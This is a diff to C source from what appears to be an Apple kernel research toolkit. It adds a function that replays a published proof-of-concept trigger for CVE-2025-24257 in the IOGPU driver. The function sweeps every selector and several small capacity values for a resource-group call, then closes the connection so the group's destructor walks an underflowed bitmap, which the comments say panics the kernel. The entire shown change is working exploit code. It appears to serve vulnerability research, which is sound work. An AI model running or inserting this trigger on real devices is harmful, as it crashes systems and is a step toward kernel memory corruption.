@@ -63,6 +63,8 @@
 
 #define ol(fmt, ...) do { nk_log(fmt, ##__VA_ARGS__); \
                             nk_doc_log("group_oob.log", fmt, ##__VA_ARGS__); } while (0)
+#define ofile(fmt, ...) nk_doc_log("group_oob.log", fmt, ##__VA_ARGS__)
+static uint32_t g_calls;
 
 #define IOGPU_SEL        8u
 #define CMD_NEW_RESOURCE 0u
@@ -127,6 +129,60 @@ static int call_sel(io_connect_t conn, uint32_t cmd, uint64_t f56, uint64_t f60,
     return (int)kr;
 }
 
+
+/* ------------------------------------------------------------------ */
+/* PoC-exact mode: the published CVE-2025-24257 trigger, swept over EVERY  */
+/* selector and both user-client types.                                 */
+/*                                                                       */
+/* The public PoC (wh1te4ever/xnu_1day_practice, CVE-2025-24257/poc.c):   */
+/*   struct[0]    = 3              (IOGPUResource::newResourceGroup)       */
+/*   struct[0x38] = capacity       (1 => panic; 1,2,4,8,0x10,0x20 panic) */
+/*   output+0x10  = group pointer                                       */
+/*   selector 10, user-client type 5                                    */
+/*   the panic happens when the group is DESTROYED (process exit), so    */
+/*   closing the connection is part of the trigger.                       */
+/*                                                                       */
+/* On 23C55 the table was reorganised (two 56-entry tables, sel 64 only   */
+/* on type 33), so the selector is swept instead of assumed.              */
+/* ------------------------------------------------------------------ */
+static void poc_exact_sweep(io_connect_t conn, uint32_t type)
+{
+    static const uint32_t caps[] = { 1, 2, 4, 8, 0x10, 0x20, 0x40 };
+    static uint8_t in[0x400];
+    static uint8_t out[0x400];
+
+    for (uint32_t sel = 0; sel < 128; sel++) {
+        for (uint32_t ci = 0; ci < sizeof(caps)/sizeof(caps[0]); ci++) {
+            memset(in, 0, sizeof(in));
+            memset(out, 0, sizeof(out));
+            uint64_t three = 3;
+            memcpy(in + 0x00, &three, 8);
+            uint32_t cap = caps[ci];
+            memcpy(in + 0x38, &cap, 4);
+
+            ofile("[poc] CALL type=%u sel=%u cap=0x%x", type, sel, cap);
+            size_t on = sizeof(out);
+            kern_return_t kr = IOConnectCallStructMethod(conn, sel, in, sizeof(in), out, &on);
+            g_calls++;
+            if (kr == KERN_SUCCESS) {
+                uint64_t grp = 0;
+                memcpy(&grp, out + 0x10, 8);
+                ofile("[poc] *** CREATED type=%u sel=%u cap=0x%x grp=0x%016llx  (closing conn -> destructor -> bitmap walk)",
+                      type, sel, cap, (unsigned long long)grp);
+                nk_log("[poc] *** CREATED type=%u sel=%u cap=0x%x grp=0x%016llx",
+                       type, sel, cap, (unsigned long long)grp);
+                /* closing the connection destroys the group: that is where the
+                   underflowed bitmap mask is walked. */
+                IOServiceClose(conn);
+                ofile("[poc] conn closed (group destroyed)");
+                return;
+            } else if (kr != (kern_return_t)0xe00002c2 && kr != (kern_return_t)0xe00002c7) {
+                ofile("[poc] kr=0x%x type=%u sel=%u cap=0x%x", kr, type, sel, cap);
+            }
+        }
+    }
+}
+
 void nk_iogpu_group_oob_run(int trigger)
 {
     nk_doc_log_open("group_oob.log");
@@ -168,6 +224,14 @@ void nk_iogpu_group_oob_run(int trigger)
         } else {
             ol("[grp] read channel already up");
         }
+    }
+
+    if (trigger) {
+        /* PoC-exact sweep first: it is the published trigger and the cheapest
+           way to know whether the bug is alive on this build. */
+        ol("[grp] PoC-exact sweep on type=%u", use_type);
+        poc_exact_sweep(conn, use_type);
+        ol("[grp] PoC-exact sweep done (calls=%u)", g_calls);
     }
 
     /* ---- step 1: create a RESOURCE.
